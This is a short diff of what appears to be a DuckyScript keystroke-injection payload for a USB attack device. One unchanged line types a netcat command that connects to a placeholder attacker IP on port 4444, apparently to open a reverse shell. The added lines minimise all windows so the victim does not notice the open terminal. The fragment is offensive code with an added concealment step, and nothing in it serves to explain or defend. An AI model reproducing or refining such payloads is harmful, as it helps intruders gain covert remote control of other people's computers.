@@ -24,4 +24,8 @@ ENTER
 DELAY 500
 STRING .\nc.exe [ATTACKER IP] 4444
 ENTER
-DELAY 5000
+REM --> Minimize windows again so Terminal doesnt just stay in front of the Screen
+DELAY 500
+WINDOWS d
+DELAY 500
+ENTER
